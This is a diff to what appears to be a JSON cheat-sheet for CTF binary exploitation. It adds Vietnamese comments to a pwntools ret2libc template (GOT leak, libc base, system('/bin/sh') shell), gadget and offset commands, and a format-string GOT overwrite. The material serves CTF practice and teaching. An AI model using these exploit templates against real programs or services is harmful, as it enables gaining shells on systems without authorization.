@@ -742,11 +742,11 @@
     "commands": [
       {
         "title": "Recon nhanh",
-        "code": "file chall\nchecksec --file=chall\nldd chall\nstrings -a chall | head -50\nreadelf -h chall\nseccomp-tools dump ./chall"
+        "code": "# arch + protection\nfile chall\nchecksec --file=chall\n# libc + string đáng chú ý\nldd chall\nstrings -a chall | head -50\n# header + seccomp\nreadelf -h chall\nseccomp-tools dump ./chall"
       },
       {
         "title": "Setup libc",
-        "code": "pwninit\npatchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall"
+        "code": "# khớp libc/ld rồi chạy local\npwninit\npatchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall"
       }
     ],
     "gotchas": [
@@ -789,13 +789,13 @@
     "payloads": [
       {
         "title": "pwntools template",
-        "code": "from pwn import *\n\nelf = ELF('./chall')\nlibc = ELF('./libc.so.6')\ncontext.binary = elf\np = process(elf.path)  # remote('HOST', PORT)\n\noffset = 40  # cyclic -l ...\npop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]\nret = ROP(elf).find_gadget(['ret'])[0]\n\npayload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])\np.sendlineafter(b'> ', payload)\nleak = u64(p.recvline().strip().ljust(8, b'\\\\x00'))\nlibc_base = leak - libc.sym['puts']\nsystem = libc_base + libc.sym['system']\nbinsh = libc_base + next(libc.search(b'/bin/sh'))\n\npayload2 = flat(b'A'*offset, ret, pop_rdi, binsh, system)\np.sendlineafter(b'> ', payload2)\np.interactive()"
+        "code": "from pwn import *\n\nelf = ELF('./chall')\nlibc = ELF('./libc.so.6')\ncontext.binary = elf\np = process(elf.path)  # remote('HOST', PORT)\n\n# offset tới saved RIP (cyclic -l ...)\noffset = 40  # cyclic -l ...\n# gadget pop rdi; ret để set tham số\npop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]\n# ret để align stack trước khi gọi system\nret = ROP(elf).find_gadget(['ret'])[0]\n\n# leak puts@GOT rồi quay lại main\npayload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])\np.sendlineafter(b'> ', payload)\nleak = u64(p.recvline().strip().ljust(8, b'\\\\x00'))\n# libc_base = leak - offset puts trong libc\nlibc_base = leak - libc.sym['puts']\nsystem = libc_base + libc.sym['system']\nbinsh = libc_base + next(libc.search(b'/bin/sh'))\n\n# ret align; gọi system('/bin/sh')\npayload2 = flat(b'A'*offset, ret, pop_rdi, binsh, system)\np.sendlineafter(b'> ', payload2)\np.interactive()"
       }
     ],
     "commands": [
       {
         "title": "Gadget / offset",
-        "code": "cyclic 200\nROPgadget --binary chall | grep 'pop rdi'\none_gadget libc.so.6"
+        "code": "# tạo pattern tìm offset\ncyclic 200\n# tìm gadget pop rdi\nROPgadget --binary chall | grep 'pop rdi'\n# gadget one-shot nếu thỏa constraint\none_gadget libc.so.6"
       }
     ],
     "gotchas": [
@@ -841,7 +841,7 @@
       },
       {
         "title": "Ghi GOT",
-        "code": "from pwn import *\nelf = ELF('./chall')\np = process(elf.path)\noffset = 6  # %p offset\npayload = fmtstr_payload(offset, {elf.got['printf']: elf.plt['system']})\np.sendline(payload)"
+        "code": "from pwn import *\nelf = ELF('./chall')\np = process(elf.path)\noffset = 6  # %p offset\n# ghi printf@GOT = system@PLT\npayload = fmtstr_payload(offset, {elf.got['printf']: elf.plt['system']})\np.sendline(payload)"
       }
     ],
     "commands": [],
